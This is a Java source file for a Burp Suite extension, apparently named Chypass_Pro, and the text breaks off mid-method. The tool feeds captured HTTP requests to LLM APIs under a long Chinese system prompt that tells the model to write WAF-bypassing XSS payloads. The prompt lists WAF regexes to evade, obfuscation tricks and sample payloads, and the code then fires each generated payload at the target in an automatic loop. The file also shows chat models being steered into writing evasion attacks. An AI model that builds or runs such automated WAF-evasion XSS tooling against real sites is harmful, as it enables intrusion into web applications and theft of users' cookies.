package burp;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.concurrent.atomic.AtomicReference;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.TableCellRenderer;
import org.json.JSONObject;
import org.json.JSONArray;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;


    public class BurpExtender implements IBurpExtender, ITab, IContextMenuFactory {
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private JPanel mainPanel;
    private JSplitPane splitPane;
    private JButton sendToAIButton;
    private JButton stopButton;
    private JTextArea requestTextArea;
    private JTextArea responseTextArea;
    private JTextArea aiResponseTextArea;
    private JTextArea logTextArea;
    private JTable historyTable;
    private HistoryTableModel historyTableModel;
    private List<RequestResponseAIPair> history;
    private boolean isRunning = false;
    private String apiKey = "";
    private JTextField apiKeyField;
    private PrintWriter stdout;
    private PrintWriter stderr;
    private IHttpService currentHttpService;
    private JComboBox<String> apiProviderSelector;
    private JTextField modelNameField;
    private JLabel modelNameLabel;
    private JPanel modelConfigPanel;
    private CardLayout modelConfigLayout;
    private String originalTemplate = null;
    private List<JSONObject> messageHistory = new ArrayList<>();
    private static final int MAX_HISTORY = 3; // 保持滑动窗口的3轮对话历史
    private static final int MAX_TOKEN_LIMIT = 8000;
    private Map<Integer, Integer> testPairIdToHistoryIndex = new HashMap<>(); // 新增：跟踪测试对ID到历史索引的映射

    private static String INITIAL_PROMPT = "你是一个渗透测试专家，专注于XSS漏洞的检测和绕过WAF。我会给你完整的请求包和相应包。你需要通过以下步骤分析请求和响应：\n" +
            "而且回答牢记这条一定牢记并遵守：每轮生成的xss的payload要不一样，不能和上一轮生成的一样，就算上一轮返回响应为200，响应信息中有绕过了waf关键词，下一轮也要生成处不同的payload，此外生成的payload不要存在空格，可以使用其他替代字符利用编码、拼接等等方式替代空格，另外每轮的payload要差别大一点，组合思路跳脱一点,而且更重要的一点，确保每次生成的xss的payload是正常的，可以使用的，不能随便瞎生成，此外payload中一定尽可能少的直接出现eval、xss、alert、console.log、javascript等这些xss拦截高危词，要使用要搭配一些分割组合等这种方式，不要直接完整的将检测关键词带入到生成的payload中一定要参考下面的的waf中xss的拦截正则的规则再就加上你自己的思路，最重要的一点【我将提供一个包含特殊占位符 <xss> 的HTTP请求模板，你的任务是只为该占位符生成一个可以绕过waf的XSS payload(条件如上)，而不返回完整的HTTP请求,记住回复内容尽快短，此外一定注意生成的payload中不要保留 <xss> 占位符，只要生成的payload，并用最简单的话描述当前payload成功绕过waf，不要输出你的思考和判断依据，并用下面这个格式输出下一轮的payload:下一轮payload:xxxxx【注意：payload前后不要有多余的<、>、`等这类多余字符，payload原格式中的不要去除，此外一定牢记payload部分请不要包含换行符，所有内容都在同一行内，结束后附上标记 --payload-end--，例如:下一轮payload: <img/src=x%20onerror=window['a'+'lert'](1) --payload-end--】\n"+
            "1. 判断是否存在XSS漏洞：\n" +
            " - 检查输入点是否被正确处理/转义\n" +
            " - 观察响应中是否包含未经过滤的注入代码\n" +
            " - 查看JavaScript是否能成功执行（例如alert/console.log出现）\n" +
            " - 检查HTML结构是否被破坏或修改\n\n" +
            "2. 判断是否被WAF拦截：\n" +
            " - 响应状态码是否为403/406/429等异常状态\n" +
            " - 响应内容中是否包含拦截提示、安全警告或错误页面\n" +
            " - 检查是否返回空白页面或与预期完全不同的内容\n" +
            " - 注入的代码是否被完全删除或明显修改\n\n" +
            "3. 请你参考下列这些xss的WAF绕过技术，但不只限于这些方法：\n" +
            "而且生成的xss绕过payload尽可能的短一些，有利于限制长度的xss插入场景，此外尽可能的使用多种绕过思路进行组合绕过\n"+
            " 此外这是一些常见waf的xss拦截的正则匹配规则，你生成的payload首先要想办法不触发这些waf对xss匹配的正则：<(iframe|script|body|img|layer|div|meta|style|base|object|input)\n" +
            "(onmouseover|onerror|onload)=\n" +
            "<a\\s+[^>]*href\\s*=\\s*['\"]?javascript:.*\n"+
            "对符合进行编码，字符串分割与注释插入，将关键字拆分\n"+
            "函数调用混淆和事件属性与非传统冷漠标签的代替等\n"+
            "数据协议和流方式绕过、非常规事件触发绕过、逻辑级绕过、字符串拆解\n" +
            "叠加、隐形iframe、数学表达式、字符串逆序运算组合等\n" +
            "使用上述方法但不只限于上述思路，你也可以有自己的思路去构造多层混淆的Payload\n" +
            "但根据目标WAF的特性，动态调整payload构造策略，最大限度规避正则和黑名单过滤\n\n" +

            "一、WAF存在性检测阶段\n\n" +
            "基础特征分析：\n" +
            "检查HTTP响应头中是否包含场景WAF的标识\n" +
            "分析响应状态码异常（如403/406/501非预期状态）\n" +
            "计算请求响应时间差（>2秒可能触发行为分析）\n\n" +
            "二、基础注入验证\n\n" +
            "无害探针注入可以参考下面的，也按照你自己的思路来，随机生成，直接使用绕过思路生成即可,但生成的payload要符合xss注入的格式，不能瞎生成，每轮只生成一个就可以，参考但一定不只限于这个payload：\n" +
            "<script>alert(document.cookie)</script>\n"+
            "响应特征比对：\n" +
            "原始payload留存率分析（完整度≥80%？）\n" +
            "特殊字符存活统计（<>\"'/等字符过滤情况）\n" +
            "上下文语义完整性检测（是否破坏原有HTML结构）\n\n" +
            "三、XSS成功验证标准\n" +
            "首先必须满足条件1，就是下面的状态码正常，此外再条件2条件才能判定XSS成功：\n\n" +
            "1. 状态码正常：\n" +
            " - HTTP响应为403、400、40X这类状态码，则表示" +
            "请求被WAF阻断，AI直接判定为输出为被WAF拦截即可，不再进行分析\n\n" +
            "2. 满足以下三项中的任意两项：\n" +
            " - DOM变更检测：document.documentElement.innerHTML中包含有效payload\n" +
            " - 新建script节点可见于DOM树\n" +
            " - 错误诱导：生成非常规JS错误（如未定义函数故意调用）\n\n" +
            "注意！！！！！！不需要过多回复，只需要给我结论，是否xss成功，是否被waf拦截，然后按照上述格式要求给出一个完整的修改后的HTTP请求，请确保请求格式完全正确，我会使用你提供的请求进行测试，并将结果返回给你继续分析，如果没有收到相应包，那就直接判断被拦截，xss失败";

    /**
     * 估算文本的token数，简单认为每4个字符为1个token
     */
    private int estimateTokenCount(String text) {
        if (text == null) return 0;
        return text.length() / 4;  // 简单估算：每4个字符算1 token
    }

    /**
     * 计算消息历史中所有消息的总token数
     */
    private int calculateTotalTokens(List<JSONObject> messages) {
        int total = 0;
        for (JSONObject msg : messages) {
            total += estimateTokenCount(msg.optString("content", ""));
        }
        return total;
    }

    /**
     * 对内容进行截断处理，防止过长。maxLength可根据需求调整
     */
    private String truncateContent(String content, int maxLength) {
        if (content == null) return "";
        return content.length() > maxLength ? content.substring(0, maxLength) + "...(truncated)" : content;
    }

    /**
     * 裁剪消息历史，始终保留系统消息，并从最新的消息开始往前累加，
     * 直到总token数达到预设阈值
     */
    private void trimMessageHistory() {
        // 始终保留第一个系统提示
        List<JSONObject> newHistory = new ArrayList<>();
        if (!messageHistory.isEmpty()) {
            newHistory.add(messageHistory.get(0));
        }
        int totalTokens = newHistory.isEmpty() ? 0 : estimateTokenCount(newHistory.get(0).optString("content", ""));
        // 从最新的消息开始向前累加，直到达到token限制
        for (int i = messageHistory.size() - 1; i >= 1; i--) {
            JSONObject msg = messageHistory.get(i);
            int msgTokens = estimateTokenCount(msg.optString("content", ""));
            if (totalTokens + msgTokens < MAX_TOKEN_LIMIT) {
                newHistory.add(1, msg); // 保持系统消息在最前面
                totalTokens += msgTokens;
            } else {
                break;
            }
        }
        messageHistory = newHistory;
    }

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.history = new ArrayList<>();
        this.historyTableModel = new HistoryTableModel();

// 设置日志输出
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);

        callbacks.setExtensionName("Chypass_Pro");

        logToConsole("Chypass_Pro安装完成，开搞！！");

        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                mainPanel = new JPanel(new BorderLayout());

// 创建API设置面板 - 使用更好的布局
                JPanel apiPanel = new JPanel(new GridBagLayout());
                GridBagConstraints gbc = new GridBagConstraints();
                gbc.anchor = GridBagConstraints.WEST;
                gbc.insets = new Insets(5, 5, 5, 5);

// API提供商选择器
                gbc.gridx = 0;
                gbc.gridy = 0;
                gbc.gridwidth = 1;
                apiPanel.add(new JLabel("API Provider:"), gbc);

                gbc.gridx = 1;
                gbc.gridwidth = 2;
                apiProviderSelector = new JComboBox<>(new String[]{"DeepSeek", "SiliconFlow", "Kimi", "QwenAI"});
                apiPanel.add(apiProviderSelector, gbc);
                // 添加开发者信息标签（显示在右上角）
                // 多行文本，使用HTML换行
                // 4) "开发者信息" 多行文本
                JLabel developerLabel = new JLabel("公众号：白昼信安\n     by:M9");
                GridBagConstraints gbc_dev = new GridBagConstraints();
                gbc_dev.gridx = 3;
                gbc_dev.gridy = 0;
                gbc_dev.insets = new Insets(5, 5, 5, 5);
                gbc_dev.anchor = GridBagConstraints.EAST; // 靠右
                apiPanel.add(developerLabel, gbc_dev);

// API密钥
                gbc.gridx = 0;
                gbc.gridy = 1;
                gbc.gridwidth = 1;
                apiPanel.add(new JLabel("API Key:"), gbc);

                gbc.gridx = 1;
                gbc.gridwidth = 2;
                gbc.fill = GridBagConstraints.HORIZONTAL;
                apiKeyField = new JTextField(40);
                apiPanel.add(apiKeyField, gbc);
                //API 保存按钮
                // 加载已保存的 API Key
                String savedApiKey = callbacks.loadExtensionSetting("API_KEY");
                if (savedApiKey != null && !savedApiKey.isEmpty()) {
                    apiKeyField.setText(savedApiKey);
                    logToUI("加载已保存的 API Key");
                }

// 创建“保存 API Key”按钮
                JButton saveApiKeyButton = new JButton("保存 API Key");
// 设置按钮位置：例如放在同一行右侧（这里假设将其放在 gridx=3）
                gbc.gridx = 3;
                gbc.gridy = 1;
                gbc.gridwidth = 1;
                gbc.fill = GridBagConstraints.NONE;
                apiPanel.add(saveApiKeyButton, gbc);

// 添加保存按钮的事件监听器
                saveApiKeyButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        String key = apiKeyField.getText().trim();
                        callbacks.saveExtensionSetting("API_KEY", key);
                        logToUI("API Key 保存成功！");
                    }
                });




// 创建模型配置面板 - 使用CardLayout来根据API提供商切换
                modelConfigPanel = new JPanel();
                modelConfigLayout = new CardLayout();
                modelConfigPanel.setLayout(modelConfigLayout);

// DeepSeek模型配置（空白，因为DeepSeek不需要指定模型）
                JPanel deepseekPanel = new JPanel(new BorderLayout());
                modelConfigPanel.add(deepseekPanel, "DeepSeek");

// SiliconFlow模型配置
                JPanel siliconflowPanel = new JPanel(new GridBagLayout());
                GridBagConstraints sfGbc = new GridBagConstraints();
                sfGbc.anchor = GridBagConstraints.WEST;
                sfGbc.insets = new Insets(5, 5, 5, 5);
                sfGbc.gridx = 0;
                sfGbc.gridy = 0;
                siliconflowPanel.add(new JLabel("Model Name:"), sfGbc);

                sfGbc.gridx = 1;
                sfGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField siliconFlowModelField = new JTextField("", 40);
                siliconflowPanel.add(siliconFlowModelField, sfGbc);
                modelConfigPanel.add(siliconflowPanel, "SiliconFlow");

// Kimi模型配置
                JPanel kimiPanel = new JPanel(new GridBagLayout());
                GridBagConstraints kimiGbc = new GridBagConstraints();
                kimiGbc.anchor = GridBagConstraints.WEST;
                kimiGbc.insets = new Insets(5, 5, 5, 5);
                kimiGbc.gridx = 0;
                kimiGbc.gridy = 0;
                kimiPanel.add(new JLabel("Model Name:"), kimiGbc);

                kimiGbc.gridx = 1;
                kimiGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField kimiModelField = new JTextField("moonshot-v1-8k", 40);
                kimiPanel.add(kimiModelField, kimiGbc);
                modelConfigPanel.add(kimiPanel, "Kimi");

// QwenAI模型配置
                JPanel qwenPanel = new JPanel(new GridBagLayout());
                GridBagConstraints qwenGbc = new GridBagConstraints();
                qwenGbc.anchor = GridBagConstraints.WEST;
                qwenGbc.insets = new Insets(5, 5, 5, 5);
                qwenGbc.gridx = 0;
                qwenGbc.gridy = 0;
                qwenPanel.add(new JLabel("Model Name:"), qwenGbc);

                qwenGbc.gridx = 1;
                qwenGbc.fill = GridBagConstraints.HORIZONTAL;
                JTextField qwenModelField = new JTextField("qwen-plus", 40);
                qwenPanel.add(qwenModelField, qwenGbc);
                modelConfigPanel.add(qwenPanel, "QwenAI");

// 添加模型配置面板
                gbc.gridx = 0;
                gbc.gridy = 2;
                gbc.gridwidth = 3;
                apiPanel.add(modelConfigPanel, gbc);


// 显示初始模型配置面板
                modelConfigLayout.show(modelConfigPanel, (String) apiProviderSelector.getSelectedItem());

// 设置API提供商切换监听器
                apiProviderSelector.addItemListener(new ItemListener() {
                    @Override
                    public void itemStateChanged(ItemEvent e) {
                        if (e.getStateChange() == ItemEvent.SELECTED) {
                            String provider = (String) apiProviderSelector.getSelectedItem();
                            modelConfigLayout.show(modelConfigPanel, provider);
                        }
                    }
                });

                mainPanel.add(apiPanel, BorderLayout.NORTH);

// 创建按钮面板
                JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
                sendToAIButton = new JButton("开启AI分析");
                stopButton = new JButton("停止分析");
                JButton clearHistoryButton = new JButton("清除全部记录");
                buttonPanel.add(sendToAIButton);
                buttonPanel.add(stopButton);
                buttonPanel.add(clearHistoryButton);


                // 添加“保存模板”按钮，将当前请求文本保存为模板
                JButton saveTemplateButton = new JButton("保存模板");
                buttonPanel.add(saveTemplateButton);
                saveTemplateButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        // 将右侧请求文本框内容作为模板保存到全局变量 originalTemplate 中
                        originalTemplate = requestTextArea.getText();
                        logToUI("已保存请求模板，模板中应包含 <xss> 占位符。");
                    }
                });

// Create history table
                historyTable = new JTable(historyTableModel);
                historyTable.setAutoResizeMode(JTable.AUTO_RESIZE_ALL_COLUMNS);
                historyTable.getColumnModel().getColumn(0).setPreferredWidth(30);
                historyTable.getColumnModel().getColumn(1).setPreferredWidth(200);
                historyTable.getColumnModel().getColumn(2).setPreferredWidth(60);
                historyTable.getColumnModel().getColumn(3).setPreferredWidth(60);
                historyTable.getColumnModel().getColumn(4).setPreferredWidth(100);

// 设置历史表格的单元格渲染器，使文本垂直居中并进行截断
                TableCellRenderer centerRenderer = new DefaultTableCellRenderer() {
                    @Override
                    public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
                        Component c = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
                        if (c instanceof JLabel) {
                            JLabel label = (JLabel) c;
                            label.setHorizontalAlignment(JLabel.CENTER);
                            if (value != null && value.toString().length() > 50) {
                                label.setToolTipText(value.toString());
                            }
                        }
                        return c;
                    }
                };

// 应用渲染器到所有列
                for (int i = 0; i < historyTable.getColumnCount(); i++) {
                    historyTable.getColumnModel().getColumn(i).setCellRenderer(centerRenderer);
                }

                JScrollPane historyScrollPane = new JScrollPane(historyTable);
                requestTextArea = new JTextArea(10, 50);
                responseTextArea = new JTextArea(10, 50);
                aiResponseTextArea = new JTextArea(10, 50);
                logTextArea = new JTextArea(5, 50);
                logTextArea.setEditable(false);

                JScrollPane requestScrollPane = new JScrollPane(requestTextArea);
                JScrollPane responseScrollPane = new JScrollPane(responseTextArea);
                JScrollPane aiResponseScrollPane = new JScrollPane(aiResponseTextArea);
                JScrollPane logScrollPane = new JScrollPane(logTextArea);

                // 在 requestTextArea 初始化后，添加右键菜单
                requestTextArea.addMouseListener(new MouseAdapter() {
                    @Override
                    public void mousePressed(MouseEvent e) {
                        if (e.isPopupTrigger()) {
                            showPopup(e);
                        }
                    }

                    @Override
                    public void mouseReleased(MouseEvent e) {
                        if (e.isPopupTrigger()) {
                            showPopup(e);
                        }
                    }

                    private void showPopup(MouseEvent e) {
                        JPopupMenu popupMenu = new JPopupMenu();

                        // 创建“Send to Repeater”菜单项
                        JMenuItem sendToRepeaterItem = new JMenuItem("Send to Repeater");
                        sendToRepeaterItem.addActionListener(new ActionListener() {
                            @Override
                            public void actionPerformed(ActionEvent evt) {
                                // 这里是点击菜单后真正执行的逻辑
                                sendCurrentRequestToRepeater();
                            }
                        });

                        popupMenu.add(sendToRepeaterItem);
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                    }
                });


                JPanel requestPanel = new JPanel(new BorderLayout());
                requestPanel.add(new JLabel("Request:"), BorderLayout.NORTH);
                requestPanel.add(requestScrollPane, BorderLayout.CENTER);

                JPanel responsePanel = new JPanel(new BorderLayout());
                responsePanel.add(new JLabel("Response:"), BorderLayout.NORTH);
                responsePanel.add(responseScrollPane, BorderLayout.CENTER);

                JPanel aiResponsePanel = new JPanel(new BorderLayout());
                aiResponsePanel.add(new JLabel("AI 分析结果:"), BorderLayout.NORTH);
                aiResponsePanel.add(aiResponseScrollPane, BorderLayout.CENTER);


                JPanel logPanel = new JPanel(new BorderLayout());
                logPanel.add(new JLabel("Logs:"), BorderLayout.NORTH);
                logPanel.add(logScrollPane, BorderLayout.CENTER);


                JTabbedPane tabbedPane = new JTabbedPane();
                tabbedPane.addTab("Request", requestPanel);
                tabbedPane.addTab("Response", responsePanel);
                tabbedPane.addTab("AI 分析结果", aiResponsePanel);
                JPanel promptTabPanel = new JPanel(new BorderLayout());

// 提示词编辑区
                JTextArea promptTextArea = new JTextArea(INITIAL_PROMPT, 10, 50);
                promptTextArea.setLineWrap(true);
                promptTextArea.setWrapStyleWord(true);
                JScrollPane promptScrollPane = new JScrollPane(promptTextArea);

// “保存提示词”按钮
                JButton savePromptButton = new JButton("保存提示词");
                savePromptButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        INITIAL_PROMPT = promptTextArea.getText();
                        logToUI("AI提示词已更新！");
                    }
                });

// 布局到面板
                promptTabPanel.add(promptScrollPane, BorderLayout.CENTER);
                promptTabPanel.add(savePromptButton, BorderLayout.SOUTH);

// 把这个面板添加为一个新的标签
                tabbedPane.addTab("当前AI提示词", promptTabPanel);


                JSplitPane mainContentPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                mainContentPane.setTopComponent(tabbedPane);
                mainContentPane.setBottomComponent(logPanel);
                mainContentPane.setResizeWeight(0.8);


                JSplitPane mainSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
                mainSplitPane.setLeftComponent(historyScrollPane);
                mainSplitPane.setRightComponent(mainContentPane);
                mainSplitPane.setResizeWeight(0.3);

                JPanel centerPanel = new JPanel(new BorderLayout());
                centerPanel.add(buttonPanel, BorderLayout.NORTH);
                centerPanel.add(mainSplitPane, BorderLayout.CENTER);

                mainPanel.add(centerPanel, BorderLayout.CENTER);

// 存储模型字段引用
                modelNameField = siliconFlowModelField;

// 创建一个对象用于存储当前迭代状态
                final AtomicReference<AISessionState> sessionState = new AtomicReference<>(new AISessionState());

                sendToAIButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
// 根据当前选择的API提供商获取正确的模型名称
                        String provider = (String) apiProviderSelector.getSelectedItem();
                        if ("SiliconFlow".equals(provider)) {
                            modelNameField = siliconFlowModelField;
                        } else if ("Kimi".equals(provider)) {
                            modelNameField = kimiModelField;
                        } else if ("QwenAI".equals(provider)) {
                            modelNameField = qwenModelField;
                        }
                        startAISession(sessionState.get());
                    }
                });

                stopButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        stopAISession();
                    }
                });

                clearHistoryButton.addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent e) {
                        // 清空对话历史和测试记录
                        messageHistory.clear();
                        history.clear();
                        testPairIdToHistoryIndex.clear();
                        historyTableModel.fireTableDataChanged();

                        // 清空所有文本区域
                        requestTextArea.setText("");
                        responseTextArea.setText("");
                        aiResponseTextArea.setText("");
                        logTextArea.setText("");

                        // 清除请求模板
                        originalTemplate = "";

                        logToUI("全部面板内容和请求模板已清除");
                    }
                });

                historyTable.getSelectionModel().addListSelectionListener(e -> {
                    if (!e.getValueIsAdjusting()) {
                        int selectedRow = historyTable.getSelectedRow();
                        if (selectedRow >= 0 && selectedRow < history.size()) {
                            RequestResponseAIPair pair = history.get(selectedRow);
                            requestTextArea.setText(new String(pair.getRequest(), StandardCharsets.UTF_8));
                            responseTextArea.setText(new String(pair.getResponse(), StandardCharsets.UTF_8));
                            aiResponseTextArea.setText(pair.getAiResponse());

// 自动切换到AI Analysis选项卡来显示AI分析
                            tabbedPane.setSelectedIndex(2);
                        }
                    }
                });

                callbacks.customizeUiComponent(mainPanel);
                callbacks.addSuiteTab(BurpExtender.this);
                callbacks.registerContextMenuFactory(BurpExtender.this);

                logToUI("UI已初始化，随时可以使用");
            }
        });
    }

    // 新增：AI会话状态类，用于在不同迭代之间保持状态
    private class AISessionState {
        private int iterationCount = 0;
        private String lastAIResponse = null;
        private boolean waitingForManualFix = false;
        private String manualFixedRequest = null;
        private int lastTestPairId = -1; // 跟踪最后添加的测试对的ID

        public int getIterationCount() {
            return iterationCount;
        }

        public void incrementIterationCount() {
            this.iterationCount++;
        }

        public String getLastAIResponse() {
            return lastAIResponse;
        }

        public void setLastAIResponse(String lastAIResponse) {
            this.lastAIResponse = lastAIResponse;
        }

        public boolean isWaitingForManualFix() {
            return waitingForManualFix;
        }

        public void setWaitingForManualFix(boolean waitingForManualFix) {
            this.waitingForManualFix = waitingForManualFix;
        }

        public String getManualFixedRequest() {
            return manualFixedRequest;
        }

        public void setManualFixedRequest(String manualFixedRequest) {
            this.manualFixedRequest = manualFixedRequest;
        }

        public int getLastTestPairId() {
            return lastTestPairId;
        }

        public void setLastTestPairId(int lastTestPairId) {
            this.lastTestPairId = lastTestPairId;
        }

        public void reset() {
            iterationCount = 0;
            lastAIResponse = null;
            waitingForManualFix = false;
            manualFixedRequest = null;
            lastTestPairId = -1;
        }
    }

    @Override
    public String getTabCaption() {
        return "Chypass_Pro";
    }

    @Override
    public Component getUiComponent() {
        return mainPanel;
    }

    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();

        JMenuItem sendToPluginMenuItem = new JMenuItem("Send to Chypass_Pro");
        sendToPluginMenuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                IHttpRequestResponse[] messages = invocation.getSelectedMessages();
                if (messages != null && messages.length > 0) {
                    IHttpRequestResponse message = messages[0];
                    byte[] request = message.getRequest();
                    byte[] response = message.getResponse();

// 保存当前HTTP服务信息，以便后续使用
                    currentHttpService = message.getHttpService();

                    logToConsole("接收到的HTTP服务详情: " +
                            currentHttpService.getHost() + ":" +
                            currentHttpService.getPort() + " (" +
                            currentHttpService.getProtocol() + ")");

                    requestTextArea.setText(new String(request, StandardCharsets.UTF_8));
                    if (response != null) {
                        responseTextArea.setText(new String(response, StandardCharsets.UTF_8));
                    } else {
                        responseTextArea.setText("");
                    }

                    logToUI("从上下文菜单加载请求");
                }
            }
        });

        menuItems.add(sendToPluginMenuItem);
        return menuItems;
    }

    // 修改：使用AISessionState作为参数
    private void startAISession(AISessionState sessionState) {
        if (isRunning) {
            return;
        }

        if (currentHttpService == null) {
            JOptionPane.showMessageDialog(mainPanel,
                    "没有可用的HTTP服务详细信息。请右键单击Burp中的请求，然后选择“发送至Chypass_Pro",
                    "缺少HTTP服务详细信息",
                    JOptionPane.ERROR_MESSAGE);
            logToUI("错误:缺少HTTP服务详细信息");
            return;
        }

        apiKey = apiKeyField.getText().trim();
        if (apiKey.isEmpty()) {
            JOptionPane.showMessageDialog(mainPanel, "请输入API密钥", "需要API密钥", JOptionPane.ERROR_MESSAGE);
            logToUI("这密钥对吗老弟！");
            return;
        }

        String requestContent = requestTextArea.getText();
        if (requestContent.isEmpty()) {
            JOptionPane.showMessageDialog(mainPanel, "首先加载一个请求", "没有请求", JOptionPane.ERROR_MESSAGE);
            logToUI("这请求不对吧哥");
            return;
        }

        isRunning = true;
        sendToAIButton.setEnabled(false);
        stopButton.setEnabled(true);

// 重置状态
        sessionState.reset();

        String apiProvider = (String) apiProviderSelector.getSelectedItem();
        logToUI("开始AI会话 " + apiProvider + " API");

//如果为空，则初始化消息历史(第一次运行)
        if (messageHistory.isEmpty()) {
            // Add system message
            JSONObject systemMessage = new JSONObject();
            systemMessage.put("role", "system");
            systemMessage.put("content", INITIAL_PROMPT);
            messageHistory.add(systemMessage);
        }

// 在后台线程中启动
        new Thread(() -> {
            String initialConversation = "Initial HTTP Request:\n\n" + requestContent;
            String responseContent = responseTextArea.getText();
            if (!responseContent.isEmpty()) {
                // 对响应内容进行截断，防止过长
                responseContent = truncateContent(responseContent, 5000);
                initialConversation += "\n\nInitial HTTP Response:\n\n" + responseContent;
            }
            // 添加用户的初始消息
            JSONObject userMessage = new JSONObject();
            userMessage.put("role", "user");
            userMessage.put("content", initialConversation);

            // 使用基于token数量的裁剪方式管理对话历史
            // 始终先调用 trimMessageHistory() 确保历史不会超限，然后添加最新用户消息
            trimMessageHistory();
            messageHistory.add(userMessage);

            processAIIteration(sessionState);

        }).start();
    }

    // 新增：处理AI迭代的核心方法
    private void processAIIteration(AISessionState sessionState) {
        if (!isRunning) { return; }
        try {
            sessionState.incrementIterationCount();
            String apiProvider = (String) apiProviderSelector.getSelectedItem();
            logToUI("正在向 " + apiProvider + " API 发送对话...(第 " + sessionState.getIterationCount() + " 次迭代)");
            logToConsole("消息历史记录大小：" + messageHistory.size());
            final String currentRequest = requestTextArea.getText();
            final String currentResponse = responseTextArea.getText();
            final byte[] currentRequestBytes = currentRequest.getBytes(StandardCharsets.UTF_8);
            final byte[] currentResponseBytes = currentResponse.getBytes(StandardCharsets.UTF_8);
            String aiResponse;
            if ("DeepSeek".equals(apiProvider)) {
                aiResponse = sendToDeepSeekAI();
            } else if ("SiliconFlow".equals(apiProvider)) {
                aiResponse = sendToSiliconFlowAI();
            } else if ("QwenAI".equals(apiProvider)) {
                aiResponse = sendToQwenAI();
            } else { // 默认Kimi
                aiResponse = sendToKimiAIWithRetry(0);
            }
            logToUI("从 " + apiProvider + " AI 接收到回复");
            sessionState.setLastAIResponse(aiResponse);
            JSONObject assistantMessage = new JSONObject();
            assistantMessage.put("role", "assistant");
            assistantMessage.put("content", aiResponse);
            messageHistory.add(assistantMessage);
            final String finalAiResponse = aiResponse;
            RequestResponseAIPair currentPair = new RequestResponseAIPair(
                    currentRequestBytes,
                    currentResponseBytes,
                    finalAiResponse,
                    history.size() + 1
            );
            history.add(currentPair);

// Update AI response area and history table
            SwingUtilities.invokeLater(() -> {
                aiResponseTextArea.setText(finalAiResponse);
                historyTableModel.fireTableDataChanged();
                if (!history.isEmpty()) {
                    historyTable.setRowSelectionInterval(history.size() - 1, history.size() - 1);
                }
            });

// 定义最大重试次数
            int maxRetries = 5;
            int retryCount = 0;
            String extractedPayload = null;

// 尝试循环提取payload
            while (retryCount < maxRetries) {
                extractedPayload = extractPayloadFromAIResponse(aiResponse);
                if (extractedPayload != null && !extractedPayload.isEmpty()) {
                    break;
                }
                retryCount++;
                logToUI("提取payload失败，等待2秒后重试 (第 " + retryCount + " 次)...");
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ie) {
                    // 如果被中断，则跳出循环
                    break;
                }
            }

// 判断是否成功提取payload
            if (extractedPayload != null && !extractedPayload.isEmpty()) {
                logToUI("从AI响应中提取到payload: " + extractedPayload);
                // 1) 用模板替换 <xss>
                if (originalTemplate == null || originalTemplate.isEmpty()) {
                    handleRequestExtractionFailure(sessionState, "originalTemplate 为空，请先确认模板");
                    return;
                }
                String finalRequest = buildFinalRequest(originalTemplate, extractedPayload);

                // 2) 校验并修正请求
                finalRequest = validateAndFixRequest(finalRequest);
                if (finalRequest == null) {
                    handleRequestExtractionFailure(sessionState, "无法验证拼接后的请求");
                    return;
                }

                // 3) 发送请求
                processValidRequest(finalRequest, sessionState);
            } else {
                // 如果重试多次后依然没有提取到payload，则发送原始数据包
                logToUI("重试 " + maxRetries + " 次后仍未提取到有效payload，使用原始请求发送数据包");
                processValidRequest(requestTextArea.getText(), sessionState);
            }



// 为不同的API提供商设置不同的延迟时间
            String currentProvider = (String) apiProviderSelector.getSelectedItem();
            if ("Kimi".equals(currentProvider)) {
                logToUI("为Kimi API添加额外的延迟以避免速率限制...");
                Thread.sleep(3000); // Kimi API使用3秒延迟
            } else if ("DeepSeek".equals(currentProvider)) {
                Thread.sleep(1500); // DeepSeek使用1.5秒延迟
            } else if ("QwenAI".equals(currentProvider)) {
                Thread.sleep(2000); // QwenAI使用2秒延迟
            } else {
                Thread.sleep(1000); // 其他API使用1秒延迟
            }

// 继续下一次迭代
            processAIIteration(sessionState);

        } catch (Exception e) {
            String errorMessage = "Error: " + e.getMessage();
            logToUI(errorMessage);
            logToConsole("Exception: " + e.toString());
            e.printStackTrace(stderr);
            JOptionPane.showMessageDialog(mainPanel, errorMessage, "Error", JOptionPane.ERROR_MESSAGE);

// 恢复UI状态
            SwingUtilities.invokeLater(() -> {
                isRunning = false;
                sendToAIButton.setEnabled(true);
                stopButton.setEnabled(false);
                logToUI("由于错误，AI会话停止");
            });
        }
    }
    /**
     * 判断响应文本中是否包含 WAF 拦截的关键词
     */
    private boolean isWafIntercepted(String responseText) {
